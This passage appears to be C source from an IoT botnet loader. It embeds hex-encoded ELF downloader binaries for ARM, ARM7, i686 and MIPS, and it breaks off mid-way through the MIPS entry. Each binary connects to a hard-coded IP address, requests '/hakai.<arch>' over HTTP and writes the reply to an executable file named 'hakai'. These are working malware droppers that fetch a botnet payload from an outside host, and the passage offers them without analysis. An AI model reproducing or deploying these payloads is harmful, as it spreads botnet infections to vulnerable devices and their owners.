    BIT_32, ENDIAN_LITTLE, EM_ARM , "\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x38\x81\x00\x00\x34\x00\x00\x00\xcc\x02\x00\x00\x02\x00\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\xac\x02\x00\x00\xac\x02\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\xac\x02\x00\x00\xac\x02\x01\x00\xac\x02\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x72\x00\x00\xea\x01\x00\x90\x00\x00\x10\xa0\xe1\x00\x00\x9f\xe5\x6e\x00\x00\xea\x06\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x67\x00\x00\xea\x05\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x03\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x5f\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x56\x00\x00\xea\x04\x00\x90\x00\x01\xc0\xa0\xe1\x00\x10\xa0\xe1\x08\x00\x9f\xe5\x02\x30\xa0\xe1\x0c\x20\xa0\xe1\x4f\x00\x00\xea\x03\x00\x90\x00\x04\xe0\x2d\xe5\x0c\xd0\x4d\xe2\x07\x00\x8d\xe8\x01\x10\xa0\xe3\x0d\x20\xa0\xe1\x08\x00\x9f\xe5\x47\x00\x00\xeb\x0c\xd0\x8d\xe2\x00\x80\xbd\xe8\x66\x00\x90\x00\xf0\x40\x2d\xe9\x50\x30\xa0\xe3\x94\xd0\x4d\xe2\x83\x30\xcd\xe5\xe4\x30\x9f\xe5\x00\x60\xa0\xe3\x02\x40\xa0\xe3\xdc\x10\x9f\xe5\xdc\x20\x9f\xe5\xdc\x00\x9f\xe5\x84\x30\x8d\xe5\x80\x40\xcd\xe5\x81\x60\xcd\xe5\x82\x60\xcd\xe5\xc7\xff\xff\xeb\x01\x10\xa0\xe3\x06\x20\xa0\xe1\x00\x70\xa0\xe1\x04\x00\xa0\xe1\xe1\xff\xff\xeb\x80\x10\x8d\xe2\x00\x50\xa0\xe1\x10\x20\xa0\xe3\xc5\xff\xff\xeb\x05\x00\xa0\xe1\xa0\x10\x9f\xe5\x1b\x20\xa0\xe3\xcb\xff\xff\xeb\x1b\x00\x50\xe3\x03\x00\xa0\x13\xaf\xff\xff\x1b\x06\x40\xa0\xe1\x93\x10\x8d\xe2\x01\x20\xa0\xe3\x05\x00\xa0\xe1\xca\xff\xff\xeb\x01\x00\x50\xe3\x04\x00\xa0\xe3\xa7\xff\xff\x1b\x93\x30\xdd\xe5\x04\x44\x83\xe1\x64\x30\x9f\xe5\x03\x00\x54\xe1\xf3\xff\xff\x1a\x0d\x10\xa0\xe1\x80\x20\xa0\xe3\x05\x00\xa0\xe1\xbe\xff\xff\xeb\x00\x20\x50\xe2\x0d\x40\xa0\xe1\x0d\x10\xa0\xe1\x07\x00\xa0\xe1\x01\x00\x00\xda\xb1\xff\xff\xeb\xf4\xff\xff\xea\x05\x00\xa0\xe1\x99\xff\xff\xeb\x07\x00\xa0\xe1\x97\xff\xff\xeb\x03\x00\xa0\xe3\x91\xff\xff\xeb\x94\xd0\x8d\xe2\xf0\x80\xbd\xe8\xb2\x80\xb9\xfa\x41\x02\x00\x00\xff\x01\x00\x00\x88\x82\x00\x00\x90\x82\x00\x00\x0a\x0d\x0a\x0d\x70\x40\x2d\xe9\x10\x40\x8d\xe2\x70\x00\x94\xe8\x71\x00\x90\xef\x01\x0a\x70\xe3\x00\x40\xa0\xe1\x70\x80\xbd\x98\x03\x00\x00\xeb\x00\x30\x64\xe2\x00\x30\x80\xe5\x00\x00\xe0\xe3\x70\x80\xbd\xe8\x00\x00\x9f\xe5\x0e\xf0\xa0\xe1\xac\x02\x01\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x61\x72\x6d\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x74\x80\x00\x00\x74\x00\x00\x00\x14\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x88\x82\x00\x00\x88\x02\x00\x00\x24\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xac\x02\x01\x00\xac\x02\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xac\x02\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 916,
    // arm7
    BIT_32, ENDIAN_LITTLE, EM_ARM + 1, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x84\x81\x00\x00\x34\x00\x00\x00\x50\x03\x00\x00\x02\x00\x00\x04\x34\x00\x20\x00\x04\x00\x28\x00\x07\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80\x00\x00\xf8\x02\x00\x00\xf8\x02\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00\xf8\x02\x00\x00\xf8\x02\x01\x00\xf8\x02\x01\x00\x10\x00\x00\x00\x10\x00\x00\x00\x06\x00\x00\x00\x00\x80\x00\x00\x07\x00\x00\x00\xf8\x02\x00\x00\xf8\x02\x01\x00\xf8\x02\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\xe0\x2d\xe5\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x01\x00\xa0\xe3\x62\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x06\x00\xa0\xe3\x5a\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x05\x00\xa0\xe3\x4f\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x04\x00\xa0\xe3\x44\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x04\xe0\x2d\xe5\x01\xc0\xa0\xe1\x02\x30\xa0\xe1\x00\x10\xa0\xe1\x04\xd0\x4d\xe2\x0c\x20\xa0\xe1\x03\x00\xa0\xe3\x39\x00\x00\xeb\x04\xd0\x8d\xe2\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\xf0\x40\x2d\xe9\xb4\x10\x9f\xe5\x8c\xd0\x4d\xe2\xb0\x20\x9f\xe5\xb0\x00\x9f\xe5\xd8\xff\xff\xeb\xac\x10\x9f\xe5\x00\x50\xa0\xe1\x1c\x20\xa0\xe3\x04\x00\xa0\xe1\xde\xff\xff\xeb\x1c\x00\x50\xe3\x03\x00\xa0\x13\xc0\xff\xff\x1b\x90\x70\x9f\xe5\x00\x40\xa0\xe3\x87\x60\x8d\xe2\x06\x10\xa0\xe1\x01\x20\xa0\xe3\x04\x00\xa0\xe1\xdf\xff\xff\xeb\x01\x00\x50\xe3\x04\x00\xa0\xe3\xb6\xff\xff\x1b\x87\x30\xdd\xe5\x04\x44\x83\xe1\x07\x00\x54\xe1\xf4\xff\xff\x1a\x07\x40\x8d\xe2\x04\x10\xa0\xe1\x80\x20\xa0\xe3\x04\x00\xa0\xe1\xd3\xff\xff\xeb\x00\x20\x50\xe2\x04\x10\xa0\xe1\x05\x00\xa0\xe1\x01\x00\x00\xda\xc3\xff\xff\xeb\xf5\xff\xff\xea\x04\x00\xa0\xe1\xad\xff\xff\xeb\x05\x00\xa0\xe1\xab\xff\xff\xeb\x03\x00\xa0\xe3\xa1\xff\xff\xeb\x8c\xd0\x8d\xe2\xf0\x40\xbd\xe8\x1e\xff\x2f\xe1\x41\x02\x00\x00\xff\x01\x00\x00\xd0\x82\x00\x00\xd8\x82\x00\x00\x0a\x0d\x0a\x0d\x00\x00\x00\x00\x00\x00\x00\x00\x0d\xc0\xa0\xe1\xf0\x00\x2d\xe9\x00\x70\xa0\xe1\x01\x00\xa0\xe1\x02\x10\xa0\xe1\x03\x20\xa0\xe1\x78\x00\x9c\xe8\x00\x00\x00\xef\xf0\x00\xbd\xe8\x01\x0a\x70\xe3\x0e\xf0\xa0\x31\xff\xff\xff\xea\x04\xe0\x2d\xe5\x1c\x20\x9f\xe5\x00\x30\xa0\xe1\x02\x20\x9f\xe7\x06\x00\x00\xeb\x00\x30\x63\xe2\x02\x30\x80\xe7\x00\x00\xe0\xe3\x04\xe0\x9d\xe4\x1e\xff\x2f\xe1\x60\x80\x00\x00\x00\x00\x00\x00\x0f\x0a\xe0\xe3\x1f\xf0\x40\xe2\x00\x00\xa0\xe1\x00\x00\xa0\xe1\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x61\x72\x6d\x37\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x13\x00\x00\x00\x61\x65\x61\x62\x69\x00\x01\x09\x00\x00\x00\x06\x02\x08\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x74\x62\x73\x73\x00\x2e\x67\x6f\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\xc0\x80\x00\x00\xc0\x00\x00\x00\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\xd0\x82\x00\x00\xd0\x02\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x04\x00\x00\xf8\x02\x01\x00\xf8\x02\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\xf8\x02\x01\x00\xf8\x02\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x24\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x08\x03\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x03\x00\x00\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 1128,
    // i686
    BIT_32, ENDIAN_LITTLE, EM_386, "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x51\x81\x04\x08\x34\x00\x00\x00\xe0\x02\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x03\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xbf\x02\x00\x00\xbf\x02\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x01\x00\x00\x00\xc0\x02\x00\x00\xc0\x92\x04\x08\xc0\x92\x04\x08\x00\x00\x00\x00\x04\x00\x00\x00\x06\x00\x00\x00\x00\x10\x00\x00\x51\xe5\x74\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x04\x00\x00\x00\x55\x89\xe5\x83\xec\x10\xff\x75\x08\x6a\x01\xe8\xac\x01\x00\x00\x83\xc4\x10\xc9\xc3\x55\x89\xe5\x83\xec\x10\xff\x75\x08\x6a\x06\xe8\x97\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x08\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x6a\x05\xe8\x7f\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x1c\x8b\x45\x08\x89\x45\xf4\x8b\x45\x0c\x89\x45\xf8\x8b\x45\x10\x89\x45\xfc\x8d\x45\xf4\x50\x6a\x03\x6a\x66\xe8\x58\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x08\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x6a\x04\xe8\x40\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x08\xff\x75\x10\xff\x75\x0c\xff\x75\x08\x6a\x03\xe8\x28\x01\x00\x00\xc9\xc3\x55\x89\xe5\x83\xec\x1c\x8b\x45\x08\x89\x45\xf4\x8b\x45\x0c\x89\x45\xf8\x8b\x45\x10\x89\x45\xfc\x8d\x45\xf4\x50\x6a\x01\x6a\x66\xe8\x01\x01\x00\x00\xc9\xc3\x55\x89\xe5\x57\x56\x53\x81\xec\xb0\x00\x00\x00\x66\xc7\x45\xe0\x02\x00\x66\xc7\x45\xe2\x00\x50\xc7\x45\xe4\xb2\x80\xb9\xfa\x68\xff\x01\x00\x00\x68\x41\x02\x00\x00\x68\x9d\x82\x04\x08\xe8\x37\xff\xff\xff\x83\xc4\x0c\x89\xc7\x6a\x00\x6a\x01\x6a\x02\xe8\x96\xff\xff\xff\x83\xc4\x0c\x89\xc6\x8d\x45\xe0\x6a\x10\x50\x56\xe8\x2e\xff\xff\xff\x83\xc4\x0c\x6a\x1b\x68\xa3\x82\x04\x08\x56\xe8\x45\xff\xff\xff\x83\xc4\x10\x83\xf8\x1b\x74\x0d\x83\xec\x0c\x6a\x03\xe8\xcd\xfe\xff\xff\x83\xc4\x10\x31\xdb\x50\x8d\x45\xf3\x6a\x01\x50\x56\xe8\x39\xff\xff\xff\x83\xc4\x10\x48\x74\x0d\x83\xec\x0c\x6a\x04\xe8\xab\xfe\xff\xff\x83\xc4\x10\x0f\xbe\x45\xf3\xc1\xe3\x08\x09\xc3\x81\xfb\x0a\x0d\x0a\x0d\x75\xcf\x8d\x9d\x60\xff\xff\xff\x51\x68\x80\x00\x00\x00\x53\x56\xe8\x02\xff\xff\xff\x83\xc4\x10\x85\xc0\x7e\x0e\x52\x50\x53\x57\xe8\xda\xfe\xff\xff\x83\xc4\x10\xeb\xd8\x83\xec\x0c\x56\xe8\x7b\xfe\xff\xff\x89\x3c\x24\xe8\x73\xfe\xff\xff\xc7\x04\x24\x03\x00\x00\x00\xe8\x52\xfe\xff\xff\x83\xc4\x10\x8d\x65\xf4\x5b\x5e\x5f\x5d\xc3\x90\x90\x90\x55\x57\x56\x53\x8b\x6c\x24\x2c\x8b\x7c\x24\x28\x8b\x74\x24\x24\x8b\x54\x24\x20\x8b\x4c\x24\x1c\x8b\x5c\x24\x18\x8b\x44\x24\x14\xcd\x80\x5b\x5e\x5f\x5d\x3d\x01\xf0\xff\xff\x0f\x83\x01\x00\x00\x00\xc3\x83\xec\x0c\x89\xc2\xf7\xda\xe8\x09\x00\x00\x00\x89\x10\x83\xc8\xff\x83\xc4\x0c\xc3\xb8\xc0\x92\x04\x08\xc3\x68\x61\x6b\x61\x69\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x78\x38\x36\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x62\x73\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x94\x80\x04\x08\x94\x00\x00\x00\x09\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x00\x00\x9d\x82\x04\x08\x9d\x02\x00\x00\x22\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\xc0\x92\x04\x08\xc0\x02\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x02\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00", 936,
    // mips
    BIT_32, ENDIAN_BIG, EM_MIPS, "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00\x00\x01\x00\x40\x01\xe8\x00\x00\x00\x34\x00\x00\x05\x3c\x00\x00\x10\x07\x00\x34\x00\x20\x00\x03\x00\x28\x00\x07\x00\x06\x00\x00\x00\x01\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x00\x00\x00\x04\xb8\x00\x00\x04\xb8\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\x04\xc0\x00\x44\x04\xc0\x00\x44\x04\xc0\x00\x00\x00\x48\x00\x00\x00\x60\x00\x00\x00\x06\x00\x01\x00\x00\x64\x74\xe5\x51\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x84\x10\x03\x99\xe0\x21\x8f\x99\x80\x50\x00\x80\x28\x21\x03\x20\x00\x08\x24\x04\x0f\xa1\x3c\x1c\x00\x05\x27\x9c\x83\xf4\x03\x99\xe0\x21\x8f\x99\x80\x50\x00\x80\x28\x21\x03\x20\x00\x08\x24\x04\x0f\xa6\x3c\x1c\x00\x05\x27\x9c\x83\xd8\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x50\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa5\x3c\x1c\x00\x05\x27\x9c\x83\xb0\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbf\x00\x28\xaf\xbc\x00\x10\x8f\x99\x80\x50\xaf\xa4\x00\x18\xaf\xa5\x00\x1c\xaf\xa6\x00\x20\x24\x04\x10\x06\x27\xa6\x00\x18\x03\x20\xf8\x09\x24\x05\x00\x03\x8f\xbc\x00\x10\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c\x1c\x00\x05\x27\x9c\x83\x64\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x50\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa4\x3c\x1c\x00\x05\x27\x9c\x83\x3c\x03\x99\xe0\x21\x00\xa0\x10\x21\x8f\x99\x80\x50\x00\xc0\x38\x21\x00\x80\x28\x21\x00\x40\x30\x21\x03\x20\x00\x08\x24\x04\x0f\xa3\x3c\x1c\x00\x05\x27\x9c\x83\x14\x03\x99\xe0\x21\x27\xbd\xff\xd0\xaf\xbf\x00\x28\xaf\xbc\x00\x10\x8f\x99\x80\x50\xaf\xa4\x00\x18\xaf\xa5\x00\x1c\xaf\xa6\x00\x20\x24\x04\x10\x06\x27\xa6\x00\x18\x03\x20\xf8\x09\x24\x05\x00\x01\x8f\xbc\x00\x10\x8f\xbf\x00\x28\x00\x00\x00\x00\x03\xe0\x00\x08\x27\xbd\x00\x30\x3c\x1c\x00\x05\x27\x9c\x82\xc8\x03\x99\xe0\x21\x27\xbd\xff\x40\xaf\xbf\x00\xbc\xaf\xb2\x00\xb8\xaf\xb1\x00\xb4\xaf\xb0\x00\xb0\xaf\xbc\x00\x10\x24\x02\x00\x02\xa7\xa2\x00\x1c\x24\x02\x00\x50\x8f\x84\x80\x18\xa7\xa2\x00\x1e\x3c\x02\xb2\x80\x8f\x99\x80\x54\x34\x42\xb9\xfa\x24\x84\x04\x90\x24\x05\x03\x01\x24\x06\x01\xff\x03\x20\xf8\x09\xaf\xa2\x00\x20\x8f\xbc\x00\x10\x24\x05\x00\x02\x8f\x99\x80\x44\x00\x00\x30\x21\x24\x04\x00\x02\x03\x20\xf8\x09\x00\x40\x90\x21\x8f\xbc\x00\x10\x00\x40\x20\x21\x8f\x99\x80\x3c\x27\xa5\x00\x1c\x24\x06\x00\x10\x03\x20\xf8\x09\x00\x40\x88\x21\x8f\xbc\x00\x10\x02\x20\x20\x21\x8f\x85\x80\x18\x8f\x99\x80\x40\x24\xa5\x04\x98\x03\x20\xf8\x09\x24\x06\x00\x1c\x24\x03\x00\x1c\x8f\xbc\x00\x10\x10\x43\x00\x07\x00\x00\x80\x21\x8f\x99\x80\x48\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x03\x8f\xbc\x00\x10\x00\x00\x80\x21\x8f\x99\x80\x34\x02\x20\x20\x21\x27\xa5\x00\x18\x03\x20\xf8\x09\x24\x06\x00\x01\x8f\xbc\x00\x10\x24\x03\x00\x01\x8f\x99\x80\x48\x10\x43\x00\x04\x24\x04\x00\x04\x03\x20\xf8\x09\x00\x00\x00\x00\x8f\xbc\x00\x10\x83\xa3\x00\x18\x00\x10\x12\x00\x00\x43\x80\x25\x3c\x02\x0d\x0a\x34\x42\x0d\x0a\x16\x02\xff\xed\x00\x00\x00\x00\x8f\x99\x80\x34\x27\xb0\x00\x2c\x02\x20\x20\x21\x02\x00\x28\x21\x03\x20\xf8\x09\x24\x06\x00\x80\x8f\xbc\x00\x10\x02\x00\x28\x21\x8f\x99\x80\x40\x00\x40\x30\x21\x18\x40\x00\x06\x02\x40\x20\x21\x03\x20\xf8\x09\x00\x00\x00\x00\x8f\xbc\x00\x10\x10\x00\xff\xf0\x00\x00\x00\x00\x8f\x99\x80\x4c\x00\x00\x00\x00\x03\x20\xf8\x09\x02\x20\x20\x21\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x4c\x00\x00\x00\x00\x03\x20\xf8\x09\x02\x40\x20\x21\x8f\xbc\x00\x10\x00\x00\x00\x00\x8f\x99\x80\x48\x00\x00\x00\x00\x03\x20\xf8\x09\x24\x04\x00\x03\x8f\xbc\x00\x10\x8f\xbf\x00\xbc\x8f\xb2\x00\xb8\x8f\xb1\x00\xb4\x8f\xb0\x00\xb0\x03\xe0\x00\x08\x27\xbd\x00\xc0\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x81\x00\x03\x99\xe0\x21\x00\x80\x10\x21\x00\xa0\x20\x21\x00\xc0\x28\x21\x00\xe0\x30\x21\x8f\xa7\x00\x10\x8f\xa8\x00\x14\x8f\xa9\x00\x18\x8f\xaa\x00\x1c\x27\xbd\xff\xe0\xaf\xa8\x00\x10\xaf\xa9\x00\x14\xaf\xaa\x00\x18\xaf\xa2\x00\x1c\x8f\xa2\x00\x1c\x00\x00\x00\x0c\x14\xe0\x00\x03\x27\xbd\x00\x20\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x40\x20\x21\x8f\x99\x80\x38\x00\x00\x00\x00\x03\x20\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x90\x03\x99\xe0\x21\x27\xbd\xff\xe0\xaf\xbf\x00\x1c\xaf\xb0\x00\x18\xaf\xbc\x00\x10\x8f\x99\x80\x30\x00\x00\x00\x00\x03\x20\xf8\x09\x00\x80\x80\x21\x8f\xbc\x00\x10\xac\x50\x00\x00\x8f\xbf\x00\x1c\x8f\xb0\x00\x18\x24\x02\xff\xff\x03\xe0\x00\x08\x27\xbd\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x1c\x00\x05\x27\x9c\x80\x40\x03\x99\xe0\x21\x8f\x82\x80\x2c\x03\xe0\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x61\x6b\x61\x69\x00\x00\x00\x47\x45\x54\x20\x2f\x68\x61\x6b\x61\x69\x2e\x6d\x69\x70\x73\x20\x48\x54\x54\x50\x2f\x31\x2e\x30\x0d\x0a\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x44\x05\x10\x00\x40\x04\x70\x00\x40\x01\x74\x00\x40\x04\x20\x00\x40\x01\x00\x00\x40\x01\x4c\x00\x40\x01\x9c\x00\x40\x00\xa0\x00\x40\x00\xbc\x00\x40\x03\xb0\x00\x40\x00\xd8\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x6f\x64\x61\x74\x61\x00\x2e\x67\x6f\x74\x00\x2e\x62\x73\x73\x00\x2e\x6d\x64\x65\x62\x75\x67\x2e\x61\x62\x69\x33\x32\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x40\x00\xa0\x00\x00\x00\xa0\x00\x00\x03\xf0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x32\x00\x40\x04\x90\x00\x00\x04\x90\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x01\x10\x00\x00\x03\x00\x44\x04\xc0\x00\x00\x04\xc0\x00\x00\x00\x48\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x04\x00\x00\x00\x1e\x00\x00\x00\x08\x00\x00\x00\x03\x00\x44\x05\x10\x00\x00\x05\x08\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x05\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\